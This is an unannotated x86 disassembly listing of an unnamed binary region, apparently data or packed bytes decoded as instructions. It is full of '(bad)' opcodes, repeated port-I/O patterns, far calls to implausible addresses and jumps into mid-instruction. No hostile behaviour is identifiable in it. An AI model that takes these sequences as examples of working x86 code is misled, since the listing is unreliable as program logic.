  446f4b:	pop    es
  446f4c:	or     eax,0xd073608
  446f51:	or     BYTE PTR [edx],dh
  446f53:	pop    es
  446f54:	sbb    eax,0x1d072e08
  446f59:	or     BYTE PTR [edx],ch
  446f5b:	pop    es
  446f5c:	or     eax,0xd072608
  446f61:	or     BYTE PTR [edx],ah
  446f63:	pop    es
  446f64:	fld    QWORD PTR [edi]
  446f66:	push   ds
  446f67:	pop    es
  446f68:	fld    QWORD PTR [edi]
  446f6a:	sbb    al,BYTE PTR [edi]
  446f6c:	int    0x7
  446f6e:	push   ss
  446f6f:	pop    es
  446f70:	int    0x7
  446f72:	adc    al,BYTE PTR [edi]
  446f74:	fld    QWORD PTR [edi]
  446f76:	push   cs
  446f77:	pop    es
  446f78:	fld    QWORD PTR [edi]
  446f7a:	or     al,BYTE PTR [edi]
  446f7c:	int    0x7
  446f7e:	push   es
  446f7f:	pop    es
  446f80:	int    0x7
  446f82:	add    al,BYTE PTR [edi]
  446f84:	popf   
  446f85:	pop    es
  446f86:	inc    BYTE PTR [esi]
  446f88:	popf   
  446f89:	pop    es
  446f8a:	cli    
  446f8b:	push   es
	...
  446fa4:	add    BYTE PTR [ebp-0xbf909f9],cl
  446faa:	in     eax,dx
  446fab:	cld    
  446fac:	cmc    
  446fad:	cli    
  446fae:	in     eax,dx
  446faf:	cld    
  446fb0:	icebp  
  446fb1:	repnz in eax,dx
  446fb3:	cld    
  446fb4:	in     eax,dx
  446fb5:	cli    
  446fb6:	in     eax,dx
  446fb7:	cld    
  446fb8:	jmp    0xe6415daf
  446fbd:	cli    
  446fbe:	in     eax,dx
  446fbf:	cld    
  446fc0:	loope  0x446fb4
  446fc2:	in     eax,dx
  446fc3:	cld    
  446fc4:	(bad)  
  446fc6:	in     eax,dx
  446fc7:	cld    
  446fc8:	fptan  
  446fca:	in     eax,dx
  446fcb:	cld    
  446fcc:	aad    0xfa
  446fce:	in     eax,dx
  446fcf:	cld    
  446fd0:	shl    edx,1
  446fd2:	in     eax,dx
  446fd3:	cld    
  446fd4:	int    0xfa
  446fd6:	in     eax,dx
  446fd7:	cld    
  446fd8:	test   al,dh
  446fda:	in     eax,dx
  446fdb:	cld    
  446fdc:	cmp    al,0xed
  446fdf:	cld    
  446fe0:	jl     0x446fd2
  446fe2:	in     eax,dx
  446fe3:	cld    
  446fe4:	mov    ebp,0xb9fcedfa
  446fe9:	repnz in eax,dx
  446feb:	cld    
  446fec:	mov    ch,0xfa
  446fee:	in     eax,dx
  446fef:	cld    
  446ff0:	mov    cl,0xf2
  446ff2:	in     eax,dx
  446ff3:	cld    
  446ff4:	lods   eax,DWORD PTR ds:[esi]
  446ff5:	cli    
  446ff6:	in     eax,dx
  446ff7:	cld    
  446ff8:	test   eax,0xa5fcedf2
  446ffd:	cli    
  446ffe:	jmp    0x446ffc
  447000:	mov    eax,ds:0x9dfcebf2
  447005:	cli    
  447006:	jmp    0x447004
  447008:	cdq    
	...
  447021:	add    dl,dh
  447023:	jmp    0x447021
  447025:	xchg   ebp,eax
  447026:	cli    
  447027:	jmp    0x447025
  447029:	xchg   ecx,eax
  44702a:	bnd jmp 0x447029
  44702d:	(bad)  
  44702e:	cli    
  44702f:	jmp    0x44702d
  447031:	mov    edx,esi
  447033:	jmp    0x447031
  447035:	test   edx,edi
  447037:	jmp    0x447035
  447039:	xor    edx,0x2203e704
  44703f:	add    esp,edi
  447041:	add    ebx,DWORD PTR [esi]
  447043:	add    esp,edi
  447045:	add    ecx,DWORD PTR [edx]
  447047:	add    esp,edi
  447049:	add    eax,DWORD PTR [esi]
  44704b:	add    esp,edi
  44704d:	add    edx,DWORD PTR [edx]
  44704f:	add    esp,edi
  447051:	add    ecx,DWORD PTR [esi]
  447053:	add    esp,edi
  447055:	add    ebx,edx
  447057:	add    ah,bh
  447059:	add    edx,esi
  44705b:	add    ah,bh
  44705d:	add    eax,edx
  44705f:	add    ah,bh
  447061:	add    edi,DWORD PTR [esi-0x55fc18fe]
  447067:	add    ah,bh
  447069:	add    esp,DWORD PTR [esi-0x4dfc18fe]
  44706f:	add    ah,bh
  447071:	add    esi,ecx
  447073:	add    bh,ah
  447075:	add    esi,ebp
  447077:	add    bh,ah
  447079:	add    ebp,DWORD PTR [ecx]
  44707b:	push   es
  44707c:	out    0x3,eax
  44707e:	sbb    eax,0xde03e706
  447083:	add    ah,bh
  447085:	add    eax,DWORD PTR [eax]
	...
  44709f:	retf   0xe702
  4470a2:	add    eax,esi
  4470a4:	add    ah,bh
  4470a6:	add    edx,edx
  4470a8:	add    ah,bh
  4470aa:	add    ecx,esi
  4470ac:	add    ah,bh
  4470ae:	add    ebx,DWORD PTR [edx]
  4470b0:	add    esp,edi
  4470b2:	add    edx,DWORD PTR [esi]
  4470b4:	add    esp,edi
  4470b6:	add    eax,DWORD PTR [edx]
  4470b8:	add    esp,edi
  4470ba:	add    edi,esi
  4470bc:	add    ah,bh
  4470be:	add    ebp,edx
  4470c0:	add    ah,bh
  4470c2:	add    esp,esi
  4470c4:	add    ah,bh
  4470c6:	add    esi,edx
  4470c8:	add    ah,bh
  4470ca:	add    ebp,esi
  4470cc:	add    al,BYTE PTR [eax]
  4470ce:	jmp    0xe94673ca
  4470d3:	test   DWORD PTR [esi],0xfaf7e902
  4470d9:	add    ch,cl
  4470db:	idiv   esi
  4470dd:	add    ch,cl
  4470df:	div    edx
  4470e1:	add    ch,cl
  4470e3:	div    esi
  4470e5:	add    ch,cl
  4470e7:	imul   edx
  4470e9:	add    ch,cl
  4470eb:	imul   esi
  4470ed:	add    ch,cl
  4470ef:	mul    edx
  4470f1:	add    ch,cl
  4470f3:	mul    esi
  4470f5:	add    ch,cl
  4470f7:	neg    edx
  4470f9:	add    ch,cl
  4470fb:	neg    esi
  4470fd:	add    ch,cl
  4470ff:	not    edx
  447101:	add    ch,cl
	...
  44711b:	add    bh,dh
  44711d:	(bad)  
  44711e:	add    ch,cl
  447120:	test   edx,0xcef7e902
  447126:	add    ch,cl
  447128:	test   edx,0xc6f7e902
  44712e:	add    ch,cl
  447130:	idiv   DWORD PTR [edx-0x410816fe]
  447136:	add    ch,cl
  447138:	div    DWORD PTR [edx-0x490816fe]
  44713e:	add    ch,cl
  447140:	imul   DWORD PTR [edx-0x510816fe]
  447146:	add    ch,cl
  447148:	neg    DWORD PTR [esi-0x5d0816fe]
  44714e:	add    ch,cl
  447150:	not    DWORD PTR [esi-0x650816fe]
  447156:	add    ch,cl
  447158:	test   DWORD PTR [esi-0x6d0816fe],0x4cd0002
  447162:	mov    al,BYTE PTR ds:0x58604cd
  447168:	popf   
  447169:	add    al,0x82
  44716b:	add    eax,0x57e049d
  447170:	lea    eax,[edx+edi*2]
  447173:	add    eax,0x576048d
  447178:	popf   
  447179:	add    al,0x72
  44717b:	add    eax,0x56e049d
	...
  447198:	add    BYTE PTR [ebp-0x72fa95fc],cl
  44719e:	add    al,0x66
  4471a0:	add    eax,0x562045d
  4471a5:	pop    ebp
  4471a6:	add    al,0x5e
  4471a8:	add    eax,0x55a044d
  4471ad:	dec    ebp
  4471ae:	add    al,0x56
  4471b0:	add    eax,0x552045d
  4471b5:	pop    ebp
  4471b6:	add    al,0x4e
  4471b8:	add    eax,0x54a044d
  4471bd:	dec    ebp
  4471be:	add    al,0x46
  4471c0:	add    eax,0x542041d
  4471c5:	sbb    eax,0xd053e04
  4471ca:	add    al,0x3a
  4471cc:	add    eax,0x536040d
  4471d1:	sbb    eax,0x1d053204
  4471d6:	add    al,0x2e
  4471d8:	add    eax,0x52a040d
  4471dd:	or     eax,0xdd052604
  4471e2:	add    esp,DWORD PTR [edx]
  4471e4:	add    eax,0x51e03dd
  4471e9:	int    0x3
  4471eb:	sbb    al,BYTE PTR ds:0x51603cd
  4471f1:	hlt    
  4471f2:	in     eax,dx
  4471f3:	cld    
  4471f4:	adc    eax,0x11fcedf1
  4471f9:	stc    
  4471fa:	in     eax,dx
  4471fb:	cld    
  4471fc:	or     eax,0x0
	...
  447215:	add    cl,dh
  447217:	in     eax,dx
  447218:	cld    
  447219:	or     ecx,edi
  44721b:	in     eax,dx
  44721c:	cld    
  44721d:	add    eax,0x1fcedf1
  447222:	stc    
  447223:	in     eax,dx
  447224:	cld    
  447225:	std    
  447226:	lock in eax,dx
  447228:	cld    
  447229:	stc    
  44722a:	clc    
  44722b:	in     eax,dx
  44722c:	cld    
  44722d:	cmc    
  44722e:	lock in eax,dx
  447230:	cld    
  447231:	icebp  
  447232:	clc    
  447233:	in     eax,dx
  447234:	cld    
  447235:	in     eax,dx
  447236:	lock in eax,dx
  447238:	cld    
  447239:	jmp    0xe6416036
  44723e:	lock in eax,dx
  447240:	cld    
  447241:	loope  0x44723b
  447243:	in     eax,dx
  447244:	cld    
  447245:	(bad)  
  447247:	in     eax,dx
  447248:	cld    
  447249:	fprem  
  44724b:	in     eax,dx
  44724c:	cld    
  44724d:	aad    0xf0
  44724f:	in     eax,dx
  447250:	cld    
  447251:	sar    eax,1
  447253:	in     eax,dx
  447254:	cld    
  447255:	int    0xf0
  447257:	in     eax,dx
  447258:	cld    
  447259:	leave  
  44725a:	clc    
  44725b:	in     eax,dx
  44725c:	cld    
  44725d:	(bad)
  447260:	cld    
  447261:	sar    eax,0xed
  447264:	cld    
  447265:	mov    ebp,0xb9fcedf0
  44726a:	clc    
  44726b:	in     eax,dx
  44726c:	cld    
  44726d:	mov    ch,0xf0
  44726f:	in     eax,dx
  447270:	cld    
  447271:	mov    cl,0xf8
  447273:	in     eax,dx
  447274:	cld    
  447275:	lods   eax,DWORD PTR ds:[esi]
  447276:	lock in eax,dx
  447278:	cld    
  447279:	test   eax,0x0
	...
  447292:	add    al,bh
  447294:	jmp    0x447292
  447296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447297:	lock jmp 0x447296
  44729a:	mov    eax,ds:0x3e704f8
  44729f:	jp     0x4472a2
  4472a1:	out    0x3,eax
  4472a3:	outs   dx,BYTE PTR ds:[esi]
  4472a4:	add    edi,esp
  4472a6:	add    esp,DWORD PTR [edx+0x1]
  4472a9:	out    0x3,eax
  4472ab:	add    di,sp
  4472ae:	add    ebp,DWORD PTR [edx+0x1]
  4472b1:	out    0x3,eax
  4472b3:	jle    0x4472b6
  4472b5:	out    0x3,eax
  4472b7:	jb     0x4472ba
  4472b9:	out    0x3,eax
  4472bb:	jbe    0x4472be
  4472bd:	out    0x3,eax
  4472bf:	sbb    al,BYTE PTR [ecx]
  4472c1:	out    0x3,eax
  4472c3:	push   cs
  4472c4:	add    edi,esp
  4472c6:	add    eax,DWORD PTR [edx]
  4472c8:	add    edi,esp
  4472ca:	add    eax,DWORD PTR [esi]
  4472cc:	add    edi,esp
  4472ce:	add    ecx,DWORD PTR [edx]
  4472d0:	add    edi,esp
  4472d2:	add    ebx,esi
  4472d4:	add    bh,ah
  4472d6:	add    edx,edx
  4472d8:	add    bh,ah
  4472da:	add    edx,esi
  4472dc:	add    bh,ah
  4472de:	add    edi,DWORD PTR [edx-0x51fc1900]
  4472e4:	add    bh,ah
  4472e6:	add    esp,DWORD PTR [edx-0x59fc1900]
  4472ec:	add    bh,ah
  4472ee:	add    ebp,DWORD PTR [edx-0x41fc1900]
  4472f4:	add    bh,ah
  4472f6:	add    eax,DWORD PTR [eax]
	...
  447310:	mov    dl,0x0
  447312:	out    0x3,eax
  447314:	mov    dh,0x0
  447316:	out    0x3,eax
  447318:	fiadd  DWORD PTR [eax]
  44731a:	out    0x3,eax
  44731c:	into   
  44731d:	add    bh,ah
  44731f:	add    eax,edx
  447321:	add    bh,ah
  447323:	add    eax,esi
  447325:	add    bh,ah
  447327:	add    ecx,edx
  447329:	add    bh,ah
  44732b:	add    ebx,DWORD PTR [esi]
  44732d:	add    DWORD PTR [eax],eax
  44732f:	jmp    0xe948922b
  447334:	mul    DWORD PTR [edx]
  447336:	add    al,0xe9
  447338:	not    DWORD PTR [esi]
  44733a:	add    al,0xe9
  44733c:	neg    DWORD PTR [edx]
  44733e:	add    al,0xe9
  447340:	test   DWORD PTR [esi],0x12f7e904
  447346:	add    al,0xe9
  447348:	test   DWORD PTR [esi],0xaf7e904
  44734e:	add    al,0xe9
  447350:	idiv   esi
  447352:	add    ebp,ecx
  447354:	test   DWORD PTR [edx],0xf6f7e904
  44735a:	cld    
  44735b:	call   0xe9416e57
  447360:	imul   esi
  447362:	cld    
  447363:	call   0xe941665f
  447368:	mul    esi
  44736a:	cld    
  44736b:	call   0xe9415e67
  447370:	neg    esi
  447372:	cld    
  447373:	call   0x447378
	...
  44738c:	add    bh,dh
  44738e:	loop   0x44738c
  447390:	call   0xe9414a8c
  447395:	neg    edx
  447397:	cld    
  447398:	call   0xe9414294
  44739d:	not    edx
  44739f:	cld    
  4473a0:	call   0xe9413a9c
  4473a5:	not    DWORD PTR ds:0x19f7e8ff
  4473ab:	(bad)  
  4473ac:	call   0xe94381a8
  4473b1:	not    DWORD PTR [ecx]
  4473b3:	(bad)  
  4473b4:	call   0xe9437ab0
  4473b9:	div    DWORD PTR [edx]
  4473bb:	(bad)  
  4473bc:	call   0x43adb8
  4473c1:	or     eax,0xdd00fd01
  4473c6:	or     cl,bh
  4473c8:	add    ch,bl
  4473ca:	or     ch,dh
  4473cc:	add    ch,cl
  4473ce:	or     cl,dh
  4473d0:	add    ch,cl
  4473d2:	or     ch,ch
  4473d4:	add    ch,bl
  4473d6:	or     dl,ch
  4473d8:	add    ch,bl
  4473da:	or     ch,ah
  4473dc:	add    ch,cl
  4473de:	or     cl,ah
  4473e0:	add    ch,cl
  4473e2:	or     ch,bl
  4473e4:	add    BYTE PTR [ebp-0x62ff26f8],bl
  4473ea:	or     ch,dl
  4473ec:	add    BYTE PTR [ebp+0xd108],cl
	...
  44740a:	lea    ecx,[eax]
  44740c:	int    0x0
  44740e:	popf   
  44740f:	or     dl,cl
  447411:	add    BYTE PTR [ebp-0x72ff3af8],bl
  447417:	or     cl,al
  447419:	add    BYTE PTR [ebp+0x5d00bd08],cl
  44741f:	or     BYTE PTR [ecx-0x4af7a300],bh
  447425:	add    BYTE PTR [ebp+0x8],cl
  447428:	mov    cl,0x0
  44742a:	dec    ebp
  44742b:	or     BYTE PTR [ebp-0x56f7a300],ch
  447431:	add    BYTE PTR [ebp+0x8],bl
  447434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447435:	add    BYTE PTR [ebp+0x8],cl
  447438:	mov    eax,ds:0x9d084d00
  44743d:	add    BYTE PTR ds:0xa8ff5608,bl
  447443:	fiadd  DWORD PTR [edi+0x3d322e45]
  447449:	and    cl,BYTE PTR ds:0xfd023d33
  44744f:	or     BYTE PTR [eax],al
  447451:	add    ah,dh
  447453:	mov    ds:0xddd401bf,al
  447458:	cld    
  447459:	push   DWORD PTR [edi+0x49]
  44745c:	int    0x3f
  44745e:	imul   ebp,ebx,0x1df24339
  447464:	add    al,0x0
  447466:	hlt    
  447467:	data16 rcr BYTE PTR [ebx+ebp*8],0x53
  44746c:	cmc    
  44746d:	mov    al,BYTE PTR [eax]
	...
  447487:	clc    
  447488:	arpl   si,di
  44748a:	push   DWORD PTR [edi-0x63]
  44748d:	clc    
  44748e:	clc    
  44748f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447490:	pop    esi
  447491:	add    eax,0x75e440f9
  447496:	inc    ebx
  447497:	xlat   BYTE PTR ds:[ebx]
  447498:	(bad)  
  447499:	mov    edi,0xab184a28
  44749e:	jl     0x447458
  4474a0:	retf   0xbda7
  4474a3:	in     al,dx
  4474a4:	fnstsw WORD PTR [ecx]
  4474a6:	inc    ebx
  4474a7:	out    dx,al
  4474a8:	(bad)  
  4474aa:	push   esp
  4474ac:	data16 rcr BYTE PTR [ebx+esi*8],0x9b
  4474b1:	mov    esp,0xfd22d0fe
  4474b6:	push   esp
  4474b8:	test   BYTE PTR [edi+edi*8-0x322c2295],bh
  4474bf:	imul   ebp,DWORD PTR [esp+edi*2],0x43
  4474c3:	out    dx,al
  4474c4:	pop    esi
  4474c5:	add    eax,0x7de9c8ff
  4474ca:	inc    ebx
  4474cb:	out    dx,al
  4474cc:	fdivr  QWORD PTR [ebp-0x8]
  4474cf:	neg    BYTE PTR [eax-0x184e8308]
  4474d5:	clc    
  4474d6:	xchg   cl,cl
  4474d8:	jecxz  0x44751d
  4474da:	loopne 0x4474cd
  4474dc:	fmul   QWORD PTR [ebx+eax*1]
  4474df:	hlt    
  4474e0:	int    0xfc
  4474e2:	jmp    FWORD PTR [ecx+0x4]
  4474e5:	jmp    0x44755a
  4474e7:	adc    ebx,esi
  4474e9:	gs inc esp
	...
  447503:	add    al,dh
  447505:	repz mov dh,0x41
  447508:	jns    0x447553
  44750a:	push   es
  44750b:	cmc    
  44750c:	inc    ebp
  44750d:	inc    esp
  44750e:	call   0xa8724993
  447513:	sbb    al,0xe9
  447515:	jge    0x447542
  447517:	out    dx,al
  447518:	mov    al,ds:0xf58765c6
  44751d:	and    al,0x23
  44751f:	jecxz  0x447571
  447521:	dec    eax
  447522:	std    
  447523:	add    dh,BYTE PTR [ecx+0x48]
  447526:	(bad)  
  447527:	hlt    
  447528:	test   DWORD PTR [ebp-0x1b],eax
  44752b:	adc    ah,0xa
  44752e:	jo     0x4474ef
  447530:	add    DWORD PTR [esi+0x77f6f1fb],eax
  447536:	fld    QWORD PTR [eax-0x711900e1]
  44753c:	test   DWORD PTR [ebp-0x3a081655],0x24f58765
  447546:	sar    edi,cl
  447548:	add    BYTE PTR [eax-0x13],cl
  44754b:	(bad)  
  44754c:	cmp    BYTE PTR [esi+0x7803fdc3],al
  447552:	jecxz  0x4474d4
  447554:	mov    bh,0xe
  447556:	in     eax,0x40
  447558:	dec    esp
  447559:	sub    al,BYTE PTR [di]
  44755c:	pop    ebp
  44755d:	jle    0x44750a
  44755f:	jmp    0x810abeb6
  447564:	mov    bh,0x25
  447566:	in     eax,0x40
	...
  447580:	add    BYTE PTR ds:0xb940c648,bh
  447586:	inc    edi
  447587:	mov    BYTE PTR [ecx],0x71
  44758a:	xchg   BYTE PTR [ebx+0x1],bh
  44758d:	add    al,0x78
  44758f:	add    bh,ch
  447591:	call   eax
  447593:	clc    
  447594:	out    dx,al
  447595:	lock scas eax,DWORD PTR es:[edi]
  447597:	out    0x2d,eax
  447599:	test   BYTE PTR [eax+eax*1],0xaa
  44759d:	je     0x44760d
  44759f:	(bad)  
  4475a0:	clc    
  4475a1:	jb     0x4475ae
  4475a3:	call   0xf930664b
  4475a8:	(bad)  
  4475a9:	mov    dl,0x10
  4475ab:	mov    ebp,0xf8efc0d1
  4475b0:	jmp    0xfabfe5e9
  4475b5:	mov    bh,0x76
  4475b7:	add    dl,BYTE PTR [ecx-0x1607102c]
  4475bd:	xor    al,0xec
  4475bf:	inc    edx
  4475c0:	retf   0x7034
  4475c3:	jnp    0x4475b0
  4475c5:	xlat   BYTE PTR ds:[ebx]
  4475c6:	ins    DWORD PTR es:[edi],dx
  4475c7:	add    ebp,DWORD PTR [edx+0x72]
  4475ca:	adc    BYTE PTR [ebx],al
  4475cc:	stos   BYTE PTR es:[edi],al
  4475cd:	je     0x447614
  4475cf:	sbb    eax,0x7b7034ea
  4475d4:	jmp    0x44758d
  4475d6:	jbe    0x4475db
  4475d8:	push   0x52
  4475da:	adc    BYTE PTR [edi],al
  4475dc:	sub    dh,BYTE PTR [ebp+ebp*2-0x2]
  4475e0:	or     BYTE PTR [ebx+0x6],dh
  4475e3:	jge    0x447589
	...
  4475fd:	add    BYTE PTR [esi+eax*1+0x10b26abd],dl
  447604:	std    
  447605:	sub    DWORD PTR [edi],ecx
  447607:	test   eax,edi
  447609:	ss clc 
  44760b:	jmp    0x44764f
  44760d:	or     dh,BYTE PTR [ebp+0x37da7b6f]
  447613:	jbe    0x447633
  447615:	es mov ch,bh
  447618:	cmp    cl,ch
  44761a:	test   DWORD PTR [ecx+edi*8],0x428854a4
  447621:	add    BYTE PTR [esi],bh
  447623:	clc    
  447624:	scas   al,BYTE PTR es:[edi]
  447625:	or     BYTE PTR [eax+0xd0386f1],bl
  44762b:	test   BYTE PTR [edi-0x40c9f5fc],bh
  447631:	inc    ebp
  447632:	pop    ds
  447633:	and    eax,0xca1d0000
  447638:	test   DWORD PTR [ebp-0x12],0xde7d7bc9
  44763f:	dec    eax
  447640:	ins    DWORD PTR es:[edi],dx
  447641:	and    edi,DWORD PTR [edx+0x10fe1b3e]
  447647:	daa    
  447648:	cmp    BYTE PTR [ebp-0x11],0x13
  44764c:	ins    DWORD PTR es:[edi],dx
  44764d:	push   es
  44764e:	mov    ch,0x9c
  447650:	stc    
  447651:	(bad)  
  447652:	ffree  st(7)
  447654:	add    DWORD PTR [ebp-0x42],0x13
  447658:	scas   al,BYTE PTR es:[edi]
  447659:	or     BYTE PTR [eax-0x3],bl
  44765c:	test   DWORD PTR [ebx],eax
  44765e:	int    0x87
  447660:	mov    eax,0x4
	...
  447679:	add    BYTE PTR [eax],al
  44767b:	jp     0x447656
  44767d:	mov    ebx,0xf927d083
  447682:	ret    0x3e2a
  447685:	sbb    edi,esi
  447687:	shl    BYTE PTR [esi],1
  447689:	cmp    BYTE PTR [ebp-0x1],0x13
  44768d:	ins    DWORD PTR es:[edi],dx
  44768e:	push   es
  44768f:	and    eax,0x8dfff884
  447694:	mov    DWORD PTR [ebx-0x51ec11bb],0x85fce808
  44769e:	add    ebx,DWORD PTR [ebp-0x79]
  4476a1:	mov    eax,0xbbd92a04
  4476a6:	or     DWORD PTR [eax+0x477c200a],0xffffffdc
  4476ad:	in     al,dx
  4476ae:	(bad)  
  4476af:	jmp    0xba:0xf4457b03
  4476b6:	mov    ebp,0xf8fe044c
  4476bb:	xor    ebx,DWORD PTR [ebx+0x47]
  4476be:	sbb    eax,0x7a811af6
  4476c3:	out    0x9d,eax
  4476c5:	ja     0x4476c9
  4476c7:	or     al,0xa6
  4476c9:	add    eax,DWORD PTR [eax]
  4476cb:	hlt    
  4476cc:	call   0x7cc1:0xdbd74281
  4476d3:	mov    ecx,0x77bd07fa
  4476d8:	sub    DWORD PTR [ecx],esp
  4476da:	add    esi,DWORD PTR [edi+0x2d805a]
	...
  4476f8:	xor    al,0x39
  4476fa:	push   es
  4476fb:	call   0x415411
  447700:	mov    bh,0xc5
  447702:	mov    ebx,0xc1a6d3f9
  447707:	out    0xee,eax
  447709:	(bad)  
  44770a:	std    
  44770b:	clc    
  44770c:	ja     0x447726
  44770e:	or     bh,ch
  447710:	inc    eax
  447711:	call   0x86f71efa
  447716:	std    
  447717:	mov    esp,0x3cd9c
  44771c:	hlt    
  44771d:	call   0x7cc1:0xdad74281
  447724:	adc    eax,esp
  447726:	cmp    al,0x73
  447728:	icebp  
  447729:	pop    edx
  44772a:	dec    eax
  44772b:	sbb    eax,0x42821aed
  447730:	xlat   BYTE PTR ds:[ebx]
  447731:	call   0xe035f3f7
  447736:	or     al,0x73
  447738:	icebp  
  447739:	pop    edx
  44773a:	dec    eax
  44773b:	sbb    eax,0x7a821af7
  447740:	repnz std 
  447742:	jbe    0x447747
  447744:	ja     0x44774a
  447746:	lods   al,BYTE PTR ds:[esi]
  447747:	es test ebx,0xfde14865
  44774e:	and    eax,0xe804be83
  447753:	js     0x44774b
  447755:	fmul   QWORD PTR [eax+0x25ef2d01]
  44775b:	jmp    0x44775d
	...
  447775:	sub    eax,0x5903e704
  44777a:	test   BYTE PTR [ebx+0x3],ch
  44777d:	adc    edi,DWORD PTR [eax-0x17]
  447780:	jmp    0x447729
  447782:	out    dx,al
  447783:	fld    DWORD PTR [ecx]
  447785:	inc    ecx
  447786:	test   BYTE PTR [ebx+0x3],dl
  447789:	sti    
  44778a:	ja     0x44776d
  44778c:	jmp    0x4477c9
  44778e:	out    dx,eax
  44778f:	rol    DWORD PTR [ecx],0xa9
  447792:	cmp    BYTE PTR [ebx],0x6
  447795:	add    al,0x78
  447797:	jmp    0xaa339787
  44779c:	add    DWORD PTR [ecx-0xbfbb523],edx
  4477a2:	add    al,0xa6
  4477a4:	test   DWORD PTR [esi],edi
  4477a6:	xor    ah,BYTE PTR [edi]
  4477a8:	ja     0x4477a0
  4477aa:	fsubr  QWORD PTR [esi+0x4]
  4477ad:	hlt    
  4477ae:	add    al,0xa6
  4477b0:	test   DWORD PTR [esi],ebp
  4477b2:	add    eax,edi
  4477b4:	jbe    0x4477ad
  4477b6:	sub    DWORD PTR [ebx],0x65c1f525
  4477bc:	inc    edi
  4477bd:	icebp  
  4477be:	pop    es
  4477bf:	lds    ecx,FWORD PTR es:[eax]
  4477c2:	jo     0x4477a9
  4477c4:	adc    ecx,DWORD PTR [eax]
  4477c6:	adc    eax,0xee7f783f
  4477cb:	dec    ecx
  4477cc:	lea    esi,[esi+0x946e80a]
  4477d2:	and    BYTE PTR [ebx-0x3e09dc],0x40
	...
  4477f1:	add    ah,cl
  4477f3:	jmp    0x43c5a6f0
  4477f8:	push   ss
  4477f9:	call   0xa4c187b0
  4477fe:	sbb    BYTE PTR [ecx],cl
  447800:	mov    ebp,0x401fbb6a
  447805:	xchg   esp,eax
  447806:	std    
  447807:	fcom   QWORD PTR [edx-0x17]
  44780a:	test   DWORD PTR [edi*4+0x18eea36a],0x436ff27c
  447815:	retf   0xaffc
  447818:	jl     0x447846
  44781a:	rol    DWORD PTR [ecx],1
  44781c:	mov    ebp,0xf8eb76d1
  447821:	(bad)  
  447822:	jo     0x44788f
  447824:	adc    ch,cl
  447826:	push   0x3
  447828:	call   0xf93162dc
  44782d:	stos   BYTE PTR es:[edi],al
  44782e:	iret   
  44782f:	sbb    eax,DWORD PTR [eax]
  447831:	jmp    0x2cc1282d
  447836:	or     DWORD PTR [ebp+0x73],eax
  447839:	in     al,dx
  44783a:	jo     0x44787e
  44783c:	sbb    eax,0x7b70b8e4
  447841:	jmp    0x44785a
  447843:	jb     0x447848
  447845:	push   0x3a
  447847:	adc    BYTE PTR [ebx],al
  447849:	stos   BYTE PTR es:[edi],al
  44784a:	jo     0x44788e
  44784c:	sbb    eax,0x7b6db8ea
  447851:	jmp    0x8146ea4c
	...
  44786e:	add    BYTE PTR [esi-0x16],ch
  447871:	clc    
  447872:	data16 mov al,0xe5
  447875:	(bad)  
  447876:	call   0x92017d72
  44787b:	hlt    
  44787c:	jmp    0x447876
  44787e:	dec    esi
  44787f:	cmp    BYTE PTR [eax+0x7b],dh
  447882:	add    BYTE PTR [esi+0x41],ch
  447885:	ins    DWORD PTR es:[edi],dx
  447886:	push   es
  447887:	(bad)
  44788a:	jmp    DWORD PTR [edx]
  44788c:	leave  
  44788d:	loopne 0x44790a
  44788f:	and    BYTE PTR ds:0x289883f7,al
  447895:	stc    
  447896:	ret    0x6ece
  447899:	cli    
  44789a:	pop    ds
  44789b:	popa   
  44789c:	jmp    edi
  44789e:	imul   eax,DWORD PTR [eax],0x5
  4478a1:	test   DWORD PTR [ebx-0x3cfbd7a8],0xfff56305
  4478ab:	and    al,BYTE PTR [ecx-0x37e0dcc3]
  4478b1:	loopne 0x447871
  4478b3:	adc    ebp,ebp
  4478b5:	imul   eax
  4478b7:	(bad)  
  4478b9:	idiv   edi
  4478bb:	mov    es,WORD PTR [ebx+0x48000d]
  4478c1:	add    DWORD PTR [ebp-0x29],0x1
  4478c5:	cmp    eax,0x1b3e4e23
  4478ca:	add    ecx,DWORD PTR [esi-0x23e98a78]
  4478d0:	ins    DWORD PTR es:[edi],dx
  4478d1:	(bad)  
  4478d2:	out    0x0,eax
	...
  4478ec:	cmp    esp,ebp
  4478ee:	idiv   edi
  4478f0:	mov    es,WORD PTR [eax+0x3dcc1a3d]
  4478f6:	sbb    eax,DWORD PTR [ebx-0x3d05d828]
  4478fc:	push   ds
  4478fd:	xchg   cl,bh
  4478ff:	pop    ds
  447900:	mov    eax,ds:0x2186e836
  447905:	in     al,dx
  447906:	imul   eax
  447908:	push   edi
  447909:	add    eax,0x861efff7
  44790e:	or     eax,0x82ffa800
  447913:	inc    ebp
  447914:	hlt    
  447915:	test   DWORD PTR [ebx],0x475f1743
  44791b:	sbb    eax,0x7a7d1ef2
  447920:	or     bl,ch
  447922:	ja     0x447926
  447924:	dec    esp
  447925:	ret    0xf8f9
  447928:	push   ebx
  447929:	pop    ds
  44792a:	test   DWORD PTR [edx-0x12],eax
  44792d:	fadd   QWORD PTR [edi+0x1d]
  447930:	ja     0x4478d3
  447932:	sbb    eax,0x580636fe
  447937:	cld    
  447938:	xor    edi,ebx
  44793a:	jmp    0x4478d3
  44793c:	sub    BYTE PTR [ebx],al
  44793e:	stc    
  44793f:	jl     0x4478e2
  447941:	sar    esp,cl
  447943:	jb     0x447934
  447945:	inc    di
  447947:	push   ss
  447948:	cmc    
  447949:	mov    al,ds:0xfeb17d1d
  44794e:	pop    es
  44794f:	mov    ebp,0x0
	...
  447968:	add    BYTE PTR [edi+0x49],dh
  44796b:	adc    bh,bh
  44796d:	sbb    bl,0xe4
  447970:	xor    eax,0xbcf9baf3
  447975:	jg     0x44798f
  447977:	push   ss
  447978:	(bad)  
  447979:	cmp    bh,bh
  44797b:	jl     0x4479bf
  44797d:	pop    ss
  44797e:	loopne 0x44793d
  447980:	out    0x16,eax
  447982:	call   0xf8ff:0xfbdcf8f9
  447989:	ret    
  44798a:	pop    esi
  44798b:	adc    BYTE PTR [edx],0xf5
  44798e:	adc    eax,DWORD PTR [edx]
  447990:	call   0xf93df4a2
  447995:	mov    bh,0x76
  447997:	dec    eax
  447998:	push   ss
  447999:	cmc    
  44799a:	and    BYTE PTR ds:0xfebf317d,bl
  4479a0:	mov    esp,0xf900279c
  4479a5:	mov    eax,DWORD PTR [esi+eiz*2]
  4479a8:	and    dh,0x2
  4479ab:	fld    DWORD PTR ds:0xfe50e98c
